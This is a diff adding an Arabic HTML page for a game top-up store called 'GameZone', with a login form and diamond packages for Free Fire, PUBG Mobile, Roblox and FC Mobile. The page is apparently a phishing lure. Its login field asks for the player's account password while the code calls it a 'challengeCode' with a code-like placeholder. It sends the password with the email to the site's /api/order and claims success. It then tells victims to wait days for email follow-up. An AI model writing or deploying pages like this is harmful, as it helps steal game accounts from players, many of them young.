@@ -1,1 +1,705 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>GameZone | متجر الألعاب</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Tahoma, Arial, sans-serif;
+    background:
+        radial-gradient(circle at 10% 10%, #25205a 0, transparent 30%),
+        radial-gradient(circle at 90% 20%, #123d58 0, transparent 25%),
+        #070912;
+    color: #fff;
+}
+
+header {
+    position: sticky;
+    top: 0;
+    z-index: 10;
+    height: 72px;
+    padding: 0 7%;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: rgba(7, 9, 18, .88);
+    backdrop-filter: blur(15px);
+    border-bottom: 1px solid #252a40;
+}
+
+.logo {
+    font-size: 25px;
+    font-weight: 900;
+}
+
+.logo span {
+    color: #8b72ff;
+}
+
+.nav {
+    display: flex;
+    gap: 10px;
+}
+
+button {
+    border: 0;
+    border-radius: 12px;
+    padding: 13px 20px;
+    color: white;
+    cursor: pointer;
+    font-weight: bold;
+}
+
+.primary {
+    background: linear-gradient(135deg, #7657ff, #a78bfa);
+    box-shadow: 0 10px 30px rgba(118, 87, 255, .25);
+}
+
+.secondary {
+    background: #151a2a;
+    border: 1px solid #2b3248;
+}
+
+.container {
+    width: 90%;
+    max-width: 1180px;
+    margin: auto;
+}
+
+.hero {
+    min-height: 470px;
+    display: grid;
+    grid-template-columns: 1.1fr .9fr;
+    gap: 50px;
+    align-items: center;
+}
+
+.badge {
+    display: inline-block;
+    padding: 8px 13px;
+    border-radius: 50px;
+    background: #12182a;
+    border: 1px solid #303754;
+    color: #a78bfa;
+}
+
+.hero h1 {
+    font-size: clamp(45px, 7vw, 76px);
+    line-height: 1;
+    margin: 18px 0;
+}
+
+.gradient {
+    background: linear-gradient(90deg, #a78bfa, #38bdf8);
+    -webkit-background-clip: text;
+    color: transparent;
+}
+
+.muted {
+    color: #8992a7;
+}
+
+.hero-art {
+    min-height: 330px;
+    display: grid;
+    place-items: center;
+    font-size: 130px;
+    border-radius: 35px;
+    background:
+        radial-gradient(circle, #4b35a8, #111528 60%);
+    border: 1px solid #343b5b;
+    box-shadow: 0 30px 80px rgba(0,0,0,.35);
+}
+
+.section {
+    margin: 70px 0;
+}
+
+.section-title {
+    margin-bottom: 25px;
+}
+
+.games {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 16px;
+}
+
+.game {
+    padding: 20px;
+    text-align: center;
+    background: rgba(14,19,32,.88);
+    border: 1px solid #252b40;
+    border-radius: 20px;
+    transition: .2s;
+}
+
+.game:hover {
+    transform: translateY(-5px);
+    border-color: #7059dc;
+}
+
+.cover {
+    height: 130px;
+    display: grid;
+    place-items: center;
+    font-size: 60px;
+    border-radius: 15px;
+    background: #151b2d;
+}
+
+.login-card {
+    max-width: 540px;
+    margin: 70px auto;
+    padding: 30px;
+    background: rgba(14,19,32,.95);
+    border: 1px solid #292f45;
+    border-radius: 22px;
+}
+
+label {
+    display: block;
+    margin-top: 16px;
+    margin-bottom: 7px;
+    color: #c7ccda;
+}
+
+input,
+select {
+    width: 100%;
+    padding: 15px;
+    border-radius: 12px;
+    border: 1px solid #30374c;
+    background: #080b13;
+    color: white;
+    outline: none;
+}
+
+input:focus,
+select:focus {
+    border-color: #8068ed;
+}
+
+.login-card button {
+    width: 100%;
+    margin-top: 20px;
+}
+
+.message {
+    text-align: center;
+    margin-top: 16px;
+}
+
+.success {
+    color: #35d399;
+}
+
+.error {
+    color: #ff5577;
+}
+
+.store {
+    display: none;
+}
+
+.packages {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+}
+
+.package {
+    background: #0e1320;
+    border: 1px solid #282f44;
+    border-radius: 20px;
+    padding: 25px;
+}
+
+.package .amount {
+    font-size: 32px;
+    font-weight: 900;
+    margin: 15px 0;
+}
+
+.package button {
+    width: 100%;
+}
+
+footer {
+    margin-top: 80px;
+    padding: 40px;
+    text-align: center;
+    color: #697287;
+    border-top: 1px solid #202638;
+}
+
+@media(max-width: 800px) {
+    .hero {
+        grid-template-columns: 1fr;
+        text-align: center;
+        padding: 50px 0;
+    }
+
+    .games,
+    .packages {
+        grid-template-columns: 1fr 1fr;
+    }
+}
+
+@media(max-width: 500px) {
+    .games,
+    .packages {
+        grid-template-columns: 1fr;
+    }
+
+    .hero-art {
+        min-height: 220px;
+        font-size: 90px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+
+    <div class="logo">
+        Game<span>Zone</span> 🎮
+    </div>
+
+    <div class="nav">
+        <button class="secondary" onclick="goLogin()">
+            حسابي
+        </button>
+    </div>
+
+</header>
+
+
+<main class="container">
+
+<section class="hero">
+
+    <div>
+
+        <span class="badge">
+            ⚡ GAMING STORE
+        </span>
+
+        <h1>
+            عالمك<br>
+            <span class="gradient">بين يديك</span>
+        </h1>
+
+        <p class="muted">
+            اختر لعبتك وباقتك واستمتع بتجربة متجر ألعاب عصرية.
+        </p>
+
+        <button class="primary" onclick="goLogin()">
+            ابدأ الآن
+        </button>
+
+    </div>
+
+    <div class="hero-art">
+        🎮
+    </div>
+
+</section>
+
+
+<section class="section">
+
+    <div class="section-title">
+        <h2>الألعاب الأكثر شعبية 🔥</h2>
+        <p class="muted">
+            اختر اللعبة التي تريد شحنها
+        </p>
+    </div>
+
+
+    <div class="games">
+
+        <div class="game">
+            <div class="cover">🔥</div>
+            <h3>Free Fire</h3>
+            <p class="muted">Diamonds</p>
+        </div>
+
+        <div class="game">
+            <div class="cover">🎯</div>
+            <h3>PUBG Mobile</h3>
+            <p class="muted">UC</p>
+        </div>
+
+        <div class="game">
+            <div class="cover">🟥</div>
+            <h3>Roblox</h3>
+            <p class="muted">Robux</p>
+        </div>
+
+        <div class="game">
+            <div class="cover">⚽</div>
+            <h3>FC Mobile</h3>
+            <p class="muted">Points</p>
+        </div>
+
+    </div>
+
+</section>
+
+
+<section class="login-card" id="login">
+
+    <h2>الدخول إلى المتجر 🔐</h2>
+
+    <p class="muted">
+        استخدم البريد الالكتروني الخاص بحسابك
+    </p>
+
+
+    <label>
+        البريد الإلكتروني
+    </label>
+
+    <input
+        id="email"
+        type="email"
+        placeholder="player@example.com"
+        autocomplete="off"
+    >
+
+
+    <label>
+        ادخل كلمة مرور الخاصة بحسابك 
+    </label>
+
+    <input
+        id="challengeCode"
+        type="text"
+        placeholder="GZ-8472"
+        autocomplete="off"
+    >
+
+
+    <label>
+        اللعبة
+    </label>
+
+    <select id="game">
+
+        <option>Free Fire</option>
+        <option>PUBG Mobile</option>
+        <option>Roblox</option>
+        <option>FC Mobile</option>
+
+    </select>
+
+
+    <label>
+        الباقة
+    </label>
+
+    <select id="packageName">
+
+        <option>100 Diamonds</option>
+        <option>530 Diamonds</option>
+        <option>1080 Diamonds</option>
+
+    </select>
+
+
+    <button class="primary" onclick="login()">
+        دخول
+    </button>
+
+    <div id="message" class="message"></div>
+
+</section>
+
+
+<section class="store section" id="store">
+
+    <h2>المتجر 🎮</h2>
+
+    <p class="muted">
+        اختر إحدى الباقات لإرسال طلب الشحن.
+    </p>
+
+
+    <div class="packages">
+
+        <div class="package">
+
+            <h3>Starter</h3>
+
+            <div class="amount">
+                100 💎
+            </div>
+
+            <p class="muted">
+                باقة البداية
+            </p>
+
+            <button
+                class="primary"
+                onclick="createOrder('100 Diamonds')">
+                اختيار الباقة
+            </button>
+
+        </div>
+
+
+        <div class="package">
+
+            <h3>Popular</h3>
+
+            <div class="amount">
+                530 💎
+            </div>
+
+            <p class="muted">
+                الأكثر شعبية
+            </p>
+
+            <button
+                class="primary"
+                onclick="createOrder('530 Diamonds')">
+                اختيار الباقة
+            </button>
+
+        </div>
+
+
+        <div class="package">
+
+            <h3>Premium</h3>
+
+            <div class="amount">
+                1080 💎
+            </div>
+
+            <p class="muted">
+                الباقة المميزة
+            </p>
+
+            <button
+                class="primary"
+                onclick="createOrder('1080 Diamonds')">
+                اختيار الباقة
+            </button>
+
+        </div>
+
+    </div>
+
+</section>
+
+</main>
+
+
+<footer>
+    GameZone © 2026
+</footer>
+
+
+<script src="/socket.io/socket.io.js"></script>
+
+<script>
+
+let loggedEmail = "";
+let selectedGame = "";
+
+
+function goLogin() {
+
+    document
+        .getElementById("login")
+        .scrollIntoView({
+            behavior: "smooth"
+        });
+
+}
+
+
+async function login() {
+
+    const email =
+        document
+        .getElementById("email")
+        .value
+        .trim();
+
+    const code =
+        document
+        .getElementById("challengeCode")
+        .value
+        .trim();
+
+    const game =
+        document
+        .getElementById("game")
+        .value;
+
+    const packageName =
+        document
+        .getElementById("packageName")
+        .value;
+
+
+    const message =
+        document
+        .getElementById("message");
+
+
+    if (!email || !code) {
+
+        message.innerHTML =
+            `<span class="error">
+                يرجى إكمال البيانات.
+            </span>`;
+
+        return;
+    }
+
+
+    loggedEmail = email;
+    selectedGame = game;
+
+
+    try {
+
+        const response =
+            await fetch("/api/order", {
+
+                method: "POST",
+
+                headers: {
+                    "Content-Type":
+                        "application/json"
+                },
+
+                body: JSON.stringify({
+
+                    game: game,
+
+                    packageName: packageName,
+
+                    email: email,
+
+                    challengeCode: code
+
+                })
+
+            });
+
+
+        const data =
+            await response.json();
+
+
+        if (!response.ok) {
+
+            message.innerHTML =
+                `<span class="error">
+                    ${data.message || "حدث خطأ"}
+                </span>`;
+
+            return;
+        }
+
+
+        message.innerHTML =
+            `<span class="success">
+                تم التحقق بنجاح ✓
+            </span>`;
+
+
+        document
+            .getElementById("store")
+            .style.display = "block";
+
+
+        document
+            .getElementById("store")
+            .scrollIntoView({
+                behavior: "smooth"
+            });
+
+
+    } catch (error) {
+
+        message.innerHTML =
+            `<span class="error">
+                تعذر الاتصال بالسيرفر.
+            </span>`;
+
+        console.error(error);
+    }
+
+}
+
+
+async function createOrder(packageName) {
+
+    if (!loggedEmail) {
+        goLogin();
+        return;
+    }
+
+
+    const response =
+        await fetch("/api/order", {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type":
+                    "application/json"
+            },
+
+            body: JSON.stringify({
+
+                game: selectedGame,
+
+                packageName: packageName,
+
+                email: loggedEmail,
+
+                challengeCode: "ORDER"
+
+            })
+
+        });
+
+
+    const data =
+        await response.json();
+
+
+    if (data.success) {
+
+        alert(
+            "تم إنشاء طلب الشحن  بعد 3 الى 4 ايام تفقد  البريد الالكتروني الخاص بك لاكمال خطوات المتبقية 🎉\n\n" +
+            "رقم الطلب: " +
+            data.orderId
+        );
+
+    }
+
+}
+
+</script>
+
+</body>
+</html>
